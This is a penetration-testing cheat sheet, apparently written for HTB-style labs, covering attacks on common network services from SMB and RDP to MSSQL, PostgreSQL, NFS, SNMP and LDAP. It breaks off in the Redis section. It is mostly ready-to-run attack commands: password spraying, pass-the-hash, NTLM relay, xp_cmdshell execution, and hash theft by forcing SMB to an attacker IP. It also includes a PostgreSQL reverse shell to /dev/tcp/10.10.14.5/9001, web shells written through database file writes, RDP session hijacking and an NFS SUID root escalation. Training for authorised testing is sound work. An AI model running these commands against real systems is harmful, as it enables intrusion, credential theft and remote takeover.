# Attacking Common Services

#Services #SMB #FTP #SSH #RDP #MSSQL #MySQL #PostgreSQL #NFS #SNMP #WinRM #DNS #Email #LDAP #Redis #IPMI #Rsync #VNC #NetExec #Enumeration #BruteForce

## What is this?

Per-service playbook — enumeration, anonymous/null access, brute force, exploitation, and post-access commands for the most common network services. For AD-specific attacks see [[Active Directory Attacks]]. Pairs with [[Attacking Common Applications]] (web apps on top of these services), [[Login Brute Forcing]], and [[Password Attacks]]; each service has a deeper per-service note under `Services/`.

---

## Tools

| Tool | Service(s) | Purpose |
|---|---|---|
| [[Tools/Scanning/NMAP\|nmap]] | All | Port scan, version detection, NSE scripts |
| [[Tools/Lateral Movement/NetExec\|NetExec (nxc)]] | SMB, WinRM, MSSQL, SSH, LDAP, RDP | Auth, exec, spray, enum — maintained successor of [[Tools/Lateral Movement/crackmapexec\|crackmapexec]] (same syntax: `crackmapexec` → `nxc`). **No mysql/postgres/redis protocol.** |
| [[Tools/Lateral Movement/responder\|Responder]] | SMB/LLMNR/NBT-NS | Poison name resolution → capture or relay NetNTLM |
| [[Tools/Auth/impacket-psexec\|impacket-psexec]] / [[Tools/Lateral Movement/impacket\|smbexec]] | SMB | Remote shell via SMB |
| [[Tools/Lateral Movement/ntlmrelayx\|impacket-ntlmrelayx]] | SMB | NTLM relay → SAM dump / command exec |
| [[Tools/Lateral Movement/smbclient\|smbclient]] | SMB | Interactive share browser |
| [[Tools/Lateral Movement/smbmap\|smbmap]] | SMB | List shares and permissions |
| [[Tools/Lateral Movement/enum4linux\|enum4linux-ng]] | SMB/RPC | AD/Samba enumeration |
| [[Tools/Lateral Movement/RPCclient\|rpcclient]] | RPC/SMB | RPC enumeration (users, groups, shares) |
| [[Tools/Lateral Movement/Evil WinRM\|evil-winrm]] | WinRM | Interactive PS shell, PTH, file transfer |
| [[Tools/Auth/Hydra\|hydra]] | FTP, SSH, RDP, SMTP, MySQL, VNC | Multi-service brute force |
| [[Tools/Auth/Medusa\|medusa]] | FTP, SSH, MSSQL | Multi-service brute force |
| [[Tools/Auth/crowbar\|crowbar]] | RDP | RDP-specific brute force |
| [[Tools/Database/mssqlclient\|impacket-mssqlclient]] | MSSQL | Interactive MSSQL client |
| [[Tools/Database/sqsh\|sqsh]] | MSSQL (Sybase/TDS) | CLI DB client (Linux) — **not** a MySQL client |
| [[Tools/Database/redis-cli\|redis-cli]] | Redis | Interactive Redis client |
| [[Tools/Database/psql\|psql]] | PostgreSQL | Interactive PostgreSQL client (`COPY … FROM PROGRAM` RCE) |
| `ldapsearch` | LDAP | LDAP query tool (OpenLDAP client) |
| [[Tools/AD/ldapdomaindump\|ldapdomaindump]] | LDAP | AD LDAP dump → HTML/JSON |
| [[Tools/AD/windapsearch\|windapsearch]] | LDAP | AD-targeted LDAP queries |
| [[Tools/Email/smtp-user-enum\|smtp-user-enum]] | SMTP | SMTP user enumeration (VRFY/RCPT) |
| [[Tools/Auth/o365spray\|o365spray]] | SMTP/O365 | O365 user enum and password spray |
| [[Tools/Email/swaks\|swaks]] | SMTP | Send/test emails via CLI |
| [[Tools/Network/onesixtyone\|onesixtyone]] | SNMP | Community string brute force |
| [[Tools/Network/snmpwalk\|snmpwalk]] / [[Tools/Network/snmp-check\|snmp-check]] / [[Tools/Network/braa\|braa]] | SNMP | Tree walk / parsed summary / fast bulk walk |
| [[Tools/Network/dig\|dig]] / [[Tools/Network/fierce\|fierce]] / [[Tools/Recon/subfinder\|subfinder]] / [[Tools/Scanning/gobuster\|gobuster]] | DNS | DNS enum and subdomain discovery |
| [[Tools/Network/ssh-audit\|ssh-audit]] | SSH | Algorithm / version audit |
| `showmount` | NFS | List NFS exports (nfs-common) |
| [[Tools/File Transfer/rsync\|rsync]] | Rsync | List/download/upload rsync modules |
| `vncviewer` | VNC | Connect to VNC sessions (TigerVNC) |
| [[Tools/Remote Access/Xfreerdp\|xfreerdp]] | RDP | Connect with PTH support (Kali now ships FreeRDP 3 as `xfreerdp3`) |
| [[Tools/Payloads & Shells/metasploit\|MSF]] `ipmi_dumphashes` | IPMI | Unauthenticated IPMI hash dump |
| [[Tools/Auth/hashcat\|hashcat]] `-m 7300` | IPMI | Crack IPMI RAKP hashes |

---

## SMB — TCP 139/445

### Enumeration

```bash
# Nmap
nmap -sV -sC -p 139,445 10.10.10.10
nmap -p 445 --script smb-vuln-ms17-010 10.10.10.10      # EternalBlue check (legacy hosts)

# Null/anonymous session — list shares
smbclient -N -L //10.10.10.10
smbmap -H 10.10.10.10
smbmap -H 10.10.10.10 -u guest

# Authenticated share listing
smbclient -U user%Password123 -L //10.10.10.10
smbmap -H 10.10.10.10 -u user -p Password123

# Enumerate users, shares, groups, policies
enum4linux -a 10.10.10.10
enum4linux-ng -A 10.10.10.10

# NetExec — enum logged-on users / shares / sessions
nxc smb 10.10.10.0/24 -u administrator -p 'Password123!' --loggedon-users
nxc smb 10.10.10.10 -u user -p Password123 --shares
nxc smb 10.10.10.10 -u '' -p '' --shares       # null session

# RPCclient (null session)
rpcclient -U '' -N 10.10.10.10
rpcclient> enumdomusers
rpcclient> enumdomgroups
rpcclient> queryuser 0x3e8
```

### Connect and Browse

```bash
# Connect to share
smbclient //10.10.10.10/Finance -U user%Password123

# Mount share (Linux)
sudo mkdir /mnt/smb
sudo mount -t cifs -o username=user,password=Password123 //10.10.10.10/Finance /mnt/smb

# Mount with credential file
mount -t cifs //10.10.10.10/Finance /mnt/smb -o credentials=/tmp/creds
# /tmp/creds:
# username=user
# password=Password123
# domain=.
```

### Connect and Browse — from a Windows foothold

```powershell
# cmd — map a drive (omit /user to use the current token)
net use n: \\10.10.10.10\Finance /user:user Password123
dir n:\ /a-d /s /b | find /c ":\"          # count files before you start grepping

# PowerShell — mount with a credential object
$cred = New-Object System.Management.Automation.PSCredential('user', (ConvertTo-SecureString 'Password123' -AsPlainText -Force))
New-PSDrive -Name N -Root \\10.10.10.10\Finance -PSProvider FileSystem -Credential $cred
```

### Search Mounted Share

```bash
# Linux — find files with "cred" in name, then grep contents
find /mnt/smb/ -name '*cred*'
grep -rn 'password' /mnt/smb/ --include='*.txt' --include='*.xml' --include='*.ini'
```

```powershell
# Windows equivalents
dir n:\*cred* /s /b
findstr /s /i cred n:\*.*
Get-ChildItem -Recurse -Path N:\ -Include *cred* -File
Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -List
```

> [!tip] For large shares, let a spider do it: `nxc smb 10.10.10.10 -u user -p Password123 -M spider_plus` (JSON index of every readable file), or [[Tools/Lateral Movement/smbmap|smbmap]] `-r <share> --depth 5` (current smbmap uses lowercase `-r`; old guides show `-R`).

### Brute Force

```bash
# NetExec spray
nxc smb 10.10.10.10 -u users.txt -p 'Company01!' --local-auth

# Nmap brute
nmap -p 445 --script smb-brute --script-args userdb=users.txt,passdb=passwords.txt 10.10.10.10
```

### Remote Execution

```bash
# NetExec exec (smbexec, wmiexec, atexec)
nxc smb 10.10.10.10 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec

# PSExec (impacket — requires admin + writable share)
impacket-psexec administrator:'Password123!'@10.10.10.10
impacket-smbexec administrator:'Password123!'@10.10.10.10

# Pass-the-Hash
nxc smb 10.10.10.10 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
impacket-psexec administrator@10.10.10.10 -hashes :2B576ACBE6BCFDA7294D6BD18041B8FE
xfreerdp /v:10.10.10.10 /u:administrator /pth:2B576ACBE6BCFDA7294D6BD18041B8FE

# Dump SAM
nxc smb 10.10.10.10 -u Administrator -p 'Password123!' --sam
```

### NTLM Relay

```bash
# 0. Relay only works against hosts with SMB signing NOT required — build the target list first
nxc smb 10.10.10.0/24 --gen-relay-list relay.txt

# 1. Turn SMB off in /usr/share/responder/Responder.conf (SMB = Off) so ntlmrelayx can own 445
# 2. Run Responder to poison LLMNR/NBT-NS — victims authenticate to you
sudo responder -I tun0

# 3. Relay to targets — dumps the SAM by default (relayed user must be local admin on the target)
impacket-ntlmrelayx --no-http-server -smb2support -tf relay.txt

# 3b. Relay + run command
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.10.146 -c 'powershell -e <b64>'
```

> [!note] You can't relay a hash back to the host it came from (MS08-068). DCs require signing by default, so relaying to a DC over SMB fails. Relay to LDAP/ADCS instead (see [[Tools/Lateral Movement/ntlmrelayx|ntlmrelayx]]).

---

## FTP — TCP 21

### Enumeration

```bash
nmap -sV -sC -p 21 10.10.10.10
nmap -p 21 --script ftp-anon,ftp-brute 10.10.10.10
```

### Anonymous Login

```bash
ftp 10.10.10.10
# username: anonymous  password: (blank or email)

# Or with client
ftp -n 10.10.10.10
ftp> user anonymous
ftp> ls
ftp> get file.txt
ftp> put shell.php       # upload if writable

# Mirror everything readable in one go (lands in ./10.10.10.10/)
wget -m --no-passive ftp://anonymous:anonymous@10.10.10.10
```

### Brute Force

```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt ftp://10.10.10.10
medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.10.10.10 -M ftp
```

### FTP Bounce Attack

Use a vulnerable FTP server to port scan internal hosts:

```bash
nmap -Pn -v -n -p 80 -b anonymous:password@10.10.10.213 172.17.0.2
```

---

## SSH — TCP 22

### Enumeration

```bash
nmap -sV -sC -p 22 10.10.10.10
ssh-audit 10.10.10.10          # check supported algorithms / version
```

### Brute Force

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10
hydra -L users.txt -P passwords.txt ssh://10.10.10.10 -t 4

medusa -u root -P passwords.txt -h 10.10.10.10 -M ssh

# NetExec
nxc ssh 10.10.10.10 -u users.txt -p passwords.txt
```

### Connect / Key-Based

```bash
# Password auth
ssh user@10.10.10.10

# Private key — ssh refuses a key that's group/world-readable, so chmod first
chmod 600 id_rsa
ssh -i id_rsa user@10.10.10.10

# Re-enable older algorithms (legacy targets) — the leading "+" appends instead of replacing the list
ssh -o KexAlgorithms=+diffie-hellman-group1-sha1 -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa user@10.10.10.10
```

### SSH Tunneling (Pivoting)

```bash
# Local forward — reach 192.168.1.10:80 via attacker:9001
ssh -L 9001:192.168.1.10:80 user@10.10.10.10

# Dynamic SOCKS proxy (proxychains) — port must match the socks line in /etc/proxychains4.conf
ssh -D 9050 user@10.10.10.10
# then: proxychains nmap -sT -Pn 192.168.1.10

# Remote forward — target's port 9001 → your listener (catch shells from deeper hosts)
ssh -R 9001:127.0.0.1:9001 user@10.10.10.10
```

> Full pivoting coverage: [[Pivoting, Tunneling & Port Forwarding]].

---

## Email — SMTP/IMAP/POP3

| Port | Protocol | Notes |
|---|---|---|
| TCP/25 | SMTP | Unencrypted (server-to-server) |
| TCP/587 | SMTP | Submission (STARTTLS) |
| TCP/465 | SMTPS | Encrypted |
| TCP/110 | POP3 | Unencrypted |
| TCP/995 | POP3S | Encrypted |
| TCP/143 | IMAP | Unencrypted |
| TCP/993 | IMAPS | Encrypted |

### Enumeration

```bash
# Nmap
nmap -Pn -sV -sC -p 25,110,143,465,587,993,995 10.10.10.10

# MX records
host -t MX target.com
dig mx target.com | grep -v '^;'

# Open relay check
nmap -p 25 --script smtp-open-relay 10.10.10.10

# SMTP user enumeration
smtp-user-enum -M RCPT -U users.txt -D target.com -t 10.10.10.10
smtp-user-enum -M VRFY -U users.txt -t 10.10.10.10
```

### SMTP Manual Commands

```bash
telnet 10.10.10.10 25
EHLO test
VRFY admin@target.com        # verify if user exists
RCPT TO:<admin@target.com>   # another enum method
```

### Office 365 Enumeration / Spray

```bash
# Validate domain on O365
python3 o365spray.py --validate --domain target.com

# Enumerate users
python3 o365spray.py --enum -U users.txt --domain target.com

# Password spray
python3 o365spray.py --spray -U users.txt -p 'March2024!' --count 1 --lockout 1 --domain target.com
```

### Brute Force (POP3/IMAP)

```bash
hydra -L users.txt -P passwords.txt -f 10.10.10.10 pop3
hydra -L users.txt -P passwords.txt -f 10.10.10.10 imap
```

### Read Mail with Valid Creds

```bash
# IMAPS with curl — list folders, then fetch a message
curl -k 'imaps://10.10.10.10' --user user:Password123
curl -k 'imaps://10.10.10.10/INBOX;UID=1' --user user:Password123

# Manual IMAP over TLS
openssl s_client -connect 10.10.10.10:993 -quiet
a1 LOGIN user Password123
a2 LIST "" "*"
a3 SELECT INBOX
a4 FETCH 1 BODY[]

# Manual POP3 over TLS
openssl s_client -connect 10.10.10.10:995 -quiet
USER user
PASS Password123
LIST
RETR 1
```

### Send Email via SMTP (swaks)

```bash
# Send test email (open relay abuse / phishing)
swaks --to victim@target.com --from admin@target.com --server 10.10.10.10 --body "Click here" --header "Subject: Test"

# With attachment
swaks --to victim@target.com --from admin@target.com --server 10.10.10.10 --attach malicious.docx
```

---

## DNS — TCP/UDP 53

### Enumeration

```bash
# Nmap
nmap -p 53 -sV -sC 10.10.10.10

# Zone transfer (AXFR)
dig AXFR @10.10.10.10 target.com
dig AXFR @ns1.target.com target.com
host -l target.com 10.10.10.10          # alternative

# Subdomain brute
fierce --domain target.com
subfinder -d target.com -v
subbrute target.com -s names.txt -r resolvers.txt
gobuster dns --do target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
# (current gobuster — 3.8.x on Kali — uses --do/--domain; older guides show -d, which now errors)

# Record lookup
host -t A mail.target.com
host -t MX target.com
host -t NS target.com
host -t TXT target.com       # SPF/DMARC/verification tokens — reveals SaaS in use
dig any target.com           # many servers refuse ANY (RFC 8482) — query types individually if empty
```

### Subdomain Takeover

```bash
# Check if a subdomain CNAME points to unclaimed resource
host sub.target.com            # if CNAME → service provider
# If provider shows "unclaimed" page → register the external resource

# Tool
# https://github.com/EdOverflow/can-i-take-over-xyz
```

### DNS Cache Poisoning (ettercap)

```bash
# Local-network MITM only — you must be on the victim's L2 segment
# 1. Edit /etc/ettercap/etter.dns — add an A record for the target domain pointing to attacker IP
#      inlanefreight.com      A   10.10.14.5
#      *.inlanefreight.com    A   10.10.14.5
# 2. In ettercap: Hosts > Scan for Hosts
# 3. Victim IP → Add to Target1, default gateway → Add to Target2
# 4. MITM > ARP poisoning (sniff remote connections)
# 5. Plugins > Manage Plugins > dns_spoof (double-click to activate)
# Verify from the victim: ping inlanefreight.com → resolves to 10.10.14.5
```

---

## RDP — TCP 3389

### Enumeration

```bash
nmap -Pn -sV -sC -p 3389 10.10.10.10
nmap -p 3389 --script rdp-enum-encryption 10.10.10.10

# Metasploit
use auxiliary/scanner/rdp/rdp_scanner
set RHOSTS 10.10.10.10
run
```

### Brute Force

```bash
crowbar -b rdp -s 10.10.10.10/32 -U users.txt -c 'Password123'
hydra -L users.txt -p 'Password123' rdp://10.10.10.10
```

### Connect

```bash
# Linux clients (FreeRDP 3 on current Kali = xfreerdp3, same flags)
xfreerdp /v:10.10.10.10 /u:administrator /p:'Password123' /cert:ignore
xfreerdp /v:10.10.10.10 /u:administrator /p:'Password123' /drive:kali,/tmp   # share /tmp as drive
rdesktop -u administrator -p Password123 10.10.10.10

# Pass-the-Hash (requires DisableRestrictedAdmin = 0)
xfreerdp /v:10.10.10.10 /u:administrator /pth:NTLMHASH

# Enable PTH for RDP on target (requires existing admin shell)
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

### Session Hijacking (local admin → SYSTEM)

```bash
# List sessions — note the target's ID and YOUR session name (e.g. rdp-tcp#13)
query user

# As SYSTEM, tscon attaches another user's session to yours with no password
tscon <TARGET_SESSION_ID> /dest:<OUR_SESSION_NAME>

# Local admin but not SYSTEM — a service runs as SYSTEM, so let it call tscon
sc.exe create hijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
net start hijack
```

> [!note] HTB Academy notes this no longer works on Server 2019. The target user has to be logged in (active or disconnected) for there to be a session to steal.

---

## WinRM — TCP 5985 (HTTP) / 5986 (HTTPS)

### Enumeration

```bash
nmap -sV -p 5985,5986 10.10.10.10
nxc winrm 10.10.10.10 -u user -p Password123
```

### Connect

```bash
# evil-winrm (Linux)
evil-winrm -i 10.10.10.10 -u administrator -p 'Password123'

# Pass-the-Hash
evil-winrm -i 10.10.10.10 -u administrator -H NTLMHASH

# Pass-the-Ticket (Kerberos) — -r sets the realm (also needs a matching realm block in /etc/krb5.conf),
# -i must be the FQDN, ticket from KRB5CCNAME or -K <ccache/kirbi>
export KRB5CCNAME=/tmp/administrator.ccache
evil-winrm -i dc01.domain.local -r DOMAIN.LOCAL
# NB: evil-winrm -k is the *private key for certificate auth* (with -c / -S), not Kerberos

# PowerShell (Windows)
$s = New-PSSession -ComputerName 10.10.10.10 -Credential (Get-Credential)
Enter-PSSession $s
# Connecting by IP (or to a non-domain host) needs the target in TrustedHosts first (admin shell):
#   Set-Item WSMan:\localhost\Client\TrustedHosts -Value 10.10.10.10 -Concatenate
```

### File Transfer via evil-winrm

```bash
# Upload
upload /tmp/payload.exe C:\Windows\Temp\payload.exe

# Download
download C:\Users\Administrator\Desktop\flag.txt /tmp/
```

---

## MSSQL — TCP 1433

### Enumeration

```bash
nmap -Pn -sV -sC -p 1433 10.10.10.10
nmap -p 1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-config 10.10.10.10

# NetExec
nxc mssql 10.10.10.10 -u users.txt -p passwords.txt
```

### Connect

```bash
# Impacket (Windows or SQL auth)
impacket-mssqlclient administrator:'Password123!'@10.10.10.10
impacket-mssqlclient DOMAIN/user:'Password123!'@10.10.10.10 -windows-auth

# sqsh (Linux)
sqsh -S 10.10.10.10 -U sa -P 'Password123' -h
sqsh -S 10.10.10.10 -U '.\julio' -P 'Password123' -h    # local Windows account

# sqlcmd (Windows)
sqlcmd -S 10.10.10.10 -U sa -P 'Password123' -y 30 -Y 30
```

> [!tip] Inside `impacket-mssqlclient`, built-ins replace most of the raw T-SQL below: `enable_xp_cmdshell`, `xp_cmdshell <cmd>`, `xp_dirtree \\10.10.14.5\x`, `enum_impersonate`, `exec_as_login sa`, `enum_links`, `use_link <srv>`. Type `help` for the list — full reference in [[Tools/Database/mssqlclient|mssqlclient]].

### Enumeration Queries

```sql
-- List databases
SELECT name FROM master.dbo.sysdatabases
GO

-- Use database and list tables
USE [dbname]
GO
SELECT name FROM sys.tables
GO

-- Current user and role
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO

-- Check impersonation targets
SELECT DISTINCT b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
GO

-- Linked servers
SELECT srvname, isremote FROM sysservers
GO
```

### Command Execution (xp_cmdshell)

```sql
-- Enable xp_cmdshell
EXECUTE sp_configure 'show advanced options', 1
GO
RECONFIGURE
GO
EXECUTE sp_configure 'xp_cmdshell', 1
GO
RECONFIGURE
GO

-- Execute
EXEC xp_cmdshell 'whoami'
GO

-- On linked server
EXEC ('EXEC xp_cmdshell ''whoami''') AT [LINKEDSERVER]
GO
```

### File Read

```sql
-- OPENROWSET (no OLE needed; needs ADMINISTER BULK OPERATIONS — sysadmin has it)
SELECT * FROM OPENROWSET(BULK N'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS Contents
GO
```

### File Write (OLE Automation)

```sql
-- Enable OLE
EXECUTE sp_configure 'Ole Automation Procedures', 1
GO
RECONFIGURE
GO

-- Write web shell
DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'C:\inetpub\wwwroot\shell.asp', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<%eval request("cmd")%>'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE
GO
```

### Hash Stealing (requires Responder/SMB server)

```sql
-- Force outbound SMB connection → capture NTLMv2 hash
EXEC master..xp_dirtree '\\10.10.14.5\share'
GO
EXEC master..xp_subdirs '\\10.10.14.5\share'
GO
```

### Impersonation

```sql
-- Impersonate sa (or other login) — run from master, which every login can access by default
USE master
EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO

-- Drop back to your own login
REVERT
GO
```

---

## MySQL — TCP 3306

### Enumeration

```bash
nmap -sV -sC -p 3306 10.10.10.10
nmap -p 3306 --script mysql-info,mysql-empty-password,mysql-brute 10.10.10.10
```

### Connect

```bash
# Linux
mysql -u root -p'Password123' -h 10.10.10.10
mysql -u root -h 10.10.10.10       # no password prompt

# Kali's client is MariaDB 11.x: SSL + server-cert verification are ON by default, so a
# self-signed/no-TLS lab server fails with a TLS error — turn them off:
mysql -u root -p'Password123' -h 10.10.10.10 --skip-ssl
mysql -u root -p'Password123' -h 10.10.10.10 --skip-ssl-verify-server-cert   # keep TLS, skip the cert check

# Windows
mysql.exe -u root -pPassword123 -h 10.10.10.10
```

### Enumeration Queries

```sql
SHOW DATABASES;
USE dbname;
SHOW TABLES;
SELECT * FROM users LIMIT 10;

-- Current user and privileges
SELECT user();
SELECT @@version;
SHOW GRANTS FOR 'root'@'localhost';

-- Check file read/write restriction:
--   empty  = no restriction (anywhere the mysqld user can write)
--   a path = only that directory
--   NULL   = LOAD_FILE / INTO OUTFILE disabled
SHOW VARIABLES LIKE 'secure_file_priv';
```

### File Read / Write

```sql
-- Read local file
SELECT LOAD_FILE('/etc/passwd');

-- Write file (requires secure_file_priv = '' and write access)
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
```

### Brute Force

```bash
hydra -L users.txt -P passwords.txt mysql://10.10.10.10
medusa -u root -P passwords.txt -h 10.10.10.10 -M mysql
nmap -p 3306 --script mysql-brute --script-args userdb=users.txt,passdb=pass.txt 10.10.10.10
# NB: NetExec/CME has NO mysql protocol (only mssql) — don't reach for `nxc mysql`, it doesn't exist
```

---

## PostgreSQL — TCP 5432

### Enumeration

```bash
nmap -sV -sC -p 5432 10.10.10.10
nmap -p 5432 --script pgsql-brute 10.10.10.10
```

### Connect

```bash
# psql (Linux client, pkg postgresql-client). Default db & superuser are both "postgres"
psql -h 10.10.10.10 -U postgres -d postgres                       # prompts for password
PGPASSWORD='Password123' psql -h 10.10.10.10 -U postgres          # non-interactive
psql "postgresql://postgres:Password123@10.10.10.10:5432/postgres" # URI form

# Metasploit
use auxiliary/scanner/postgres/postgres_login
```

### Enumeration Queries

```sql
\l                         -- list databases   (SQL: SELECT datname FROM pg_database;)
\c dbname                  -- connect to a database
\dt                        -- list tables      (SQL: SELECT table_name FROM information_schema.tables;)
\du                        -- list roles/users
SELECT version();
SELECT current_user, session_user;
SHOW is_superuser;                              -- 'on' = you can RCE / read files below
SELECT usename, passwd FROM pg_shadow;          -- superuser: dump md5/SCRAM password hashes
```

### Command Execution — COPY FROM PROGRAM (CVE-2019-9193)

A superuser (or a role in `pg_execute_server_program`) runs OS commands as the **postgres** service account — "a feature, not a bug"; works on PostgreSQL 9.3+:

```sql
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';           -- executes as the postgres OS user
SELECT * FROM cmd_exec;                     -- read the captured output
-- reverse shell one-liner:
COPY cmd_exec FROM PROGRAM 'bash -c ''bash -i >& /dev/tcp/10.10.14.5/9001 0>&1''';
```

### File Read / Write

```sql
-- Read a local file (superuser)
CREATE TABLE f(t text); COPY f FROM '/etc/passwd'; SELECT * FROM f;
-- large-object alternative
SELECT lo_import('/etc/passwd', 1337); SELECT lo_get(1337);

-- Write a web shell into a writable web root
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';
```

### Brute Force

```bash
hydra -L users.txt -P passwords.txt postgres://10.10.10.10
medusa -U users.txt -P passwords.txt -h 10.10.10.10 -M postgres
```

> [!tip] `COPY … FROM PROGRAM` needs superuser or the `pg_execute_server_program` role — check `SHOW is_superuser;` first. Not superuser? Look for `dblink`/FDW to pivot to another instance, or crack the `pg_shadow` hashes offline (PG md5 = `md5(password+username)`, hashcat **`-m 12`**; SCRAM-SHA-256 on PG 10+ = **`-m 28600`**).

---

## NFS — TCP/UDP 2049

### Enumeration

```bash
nmap -sV -p 111,2049 10.10.10.10
nmap -p 111 --script nfs-ls,nfs-showmount,nfs-statfs 10.10.10.10

# List available exports
showmount -e 10.10.10.10
```

### Mount and Access

```bash
# Mount export
sudo mkdir /mnt/nfs
sudo mount -t nfs 10.10.10.10:/share /mnt/nfs -o nolock

# List files — note numeric UIDs/GIDs (-n), they're what NFS actually checks
ls -lan /mnt/nfs/

# Unmount
sudo umount /mnt/nfs
```

**UID spoofing (NFSv3 / AUTH_SYS):** the server trusts the UID your client sends. If a file is owned by UID 1001 with mode 600, create a local user with that UID and read it as them:

```bash
sudo useradd -u 1001 nfsuser
sudo -u nfsuser cat /mnt/nfs/home/alice/.ssh/id_rsa
```

### Privilege Escalation via NFS

```bash
# Test for no_root_squash from the attacker side — /etc/exports options aren't visible remotely
sudo touch /mnt/nfs/x && ls -ln /mnt/nfs/x
#   owner 0 (root)          → no_root_squash: root on attacker = root on the share
#   owner 65534 (nobody)    → root_squash (default) — fall back to UID spoofing above
# (On the target itself: cat /etc/exports)

# Use the TARGET's own bash — your Kali bash may need a newer glibc than the target has.
# 1. On the target (low-priv shell): copy its bash into the share
cp /bin/bash /<export_path>/bash
# 2. On the attacker (root): take ownership and set SUID
sudo chown root:root /mnt/nfs/bash
sudo chmod u+s /mnt/nfs/bash
# 3. On the target: run it with -p to keep euid 0
/<export_path>/bash -p     # → root shell
```

> [!note] On the target, the filesystem holding the export must not be mounted `nosuid`, or the SUID bit is ignored. Full workflow in [[Linux Priv Esc]].

---

## SNMP — UDP 161

### Enumeration

```bash
nmap -sU -p 161 10.10.10.10
nmap -sU -p 161 --script snmp-info,snmp-brute 10.10.10.10

# Walk with public community string
snmpwalk -v2c -c public 10.10.10.10
snmpwalk -v2c -c public 10.10.10.10 1.3.6.1.2.1.1    # system info OID
snmpwalk -v2c -c public 10.10.10.10 1.3.6.1.4.1.77.1.2.25  # Windows users

# onesixtyone — brute community strings
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 10.10.10.10

# braa — fast bulk walk
braa public@10.10.10.10:.1.3.6.*

# snmp-check — parsed summary (users, processes, software, network, shares)
snmp-check -c public 10.10.10.10
```

### Useful OIDs

| OID | Description |
|---|---|
| `1.3.6.1.2.1.1` | System info (hostname, OS, uptime) |
| `1.3.6.1.2.1.25.4.2.1.2` | Running processes |
| `1.3.6.1.2.1.25.4.2.1.5` | Process **command-line arguments** — passwords passed on the command line show up here |
| `1.3.6.1.2.1.25.6.3.1.2` | Installed software |
| `1.3.6.1.2.1.6.13.1.3` | Open TCP ports |
| `1.3.6.1.4.1.77.1.2.25` | Windows user accounts |

```bash
# Targeted walk
snmpwalk -v2c -c public 10.10.10.10 1.3.6.1.2.1.25.4.2.1.2    # processes
snmpwalk -v2c -c public 10.10.10.10 1.3.6.1.2.1.25.6.3.1.2    # software
snmpwalk -v2c -c public 10.10.10.10 1.3.6.1.2.1.25.4.2.1.5    # process args (creds!)

# Net-SNMP "extend" scripts — admins wire scripts into SNMP; their output is readable here
snmpwalk -v2c -c public 10.10.10.10 NET-SNMP-EXTEND-MIB::nsExtendObjects
# Symbolic MIB names need the MIBs installed: sudo apt install snmp-mibs-downloader,
# then comment out "mibs :" in /etc/snmp/snmp.conf
```

> [!tip] A **write** community (often `private`) on Net-SNMP lets you add your own `nsExtend` command, which runs as the snmpd user — see [[Services/Network Management/SNMP|SNMP]] for the RW-community RCE path.

---

## RPC — TCP 111 / 135

### Enumeration

```bash
# Linux RPC (portmapper)
nmap -sV -p 111 10.10.10.10
rpcinfo -p 10.10.10.10

# Windows RPC (MSRPC)
nmap -sV -p 135 10.10.10.10
impacket-rpcdump @10.10.10.10        # dump registered RPC endpoints

# rpcclient (SMB RPC — null session)
rpcclient -U '' -N 10.10.10.10
rpcclient> srvinfo
rpcclient> enumdomusers
rpcclient> enumdomgroups
rpcclient> getdompwinfo          # password policy
rpcclient> queryuser 0x3e8
rpcclient> netshareenumall
```

---

## LDAP — TCP 389 / 636 (LDAPS)

### Enumeration

```bash
nmap -sV -p 389,636 10.10.10.10
nmap -p 389 --script ldap-rootdse,ldap-search 10.10.10.10

# Anonymous bind — dump base DN info
ldapsearch -H ldap://10.10.10.10 -x -s base namingcontexts

# Anonymous bind — dump everything
ldapsearch -H ldap://10.10.10.10 -x -b "DC=domain,DC=local"

# Authenticated dump
ldapsearch -H ldap://10.10.10.10 -x -D "user@domain.local" -w 'Password123' -b "DC=domain,DC=local"

# Dump all users
ldapsearch -H ldap://10.10.10.10 -x -D "user@domain.local" -w 'Password123' -b "DC=domain,DC=local" "(objectClass=person)" sAMAccountName mail

# ldapdomaindump — HTML/JSON output, great for AD
ldapdomaindump -u 'domain\user' -p 'Password123' 10.10.10.10 -o /tmp/ldap/

# windapsearch — AD-specific queries
python3 windapsearch.py -d domain.local -u user -p Password123 --users
python3 windapsearch.py -d domain.local -u user -p Password123 --groups
python3 windapsearch.py -d domain.local -u user -p Password123 --da    # domain admins
```

### Null / Anonymous Bind Check

```bash
# If this returns data — anonymous bind allowed
ldapsearch -H ldap://10.10.10.10 -x -b "" -s base "(objectclass=*)" "*" +
```

---

## Redis — TCP 6379

### Enumeration

```bash
nmap -sV -p 6379 10.10.10.10
nmap -p 6379 --script redis-info 10.10.10.10

# Connect (no auth)
redis-cli -h 10.10.10.10
redis-cli -h 10.10.10.10 -a 'password'    # with auth

# Basic recon inside redis-cli
INFO server
INFO keyspace
CONFIG GET *
KEYS *
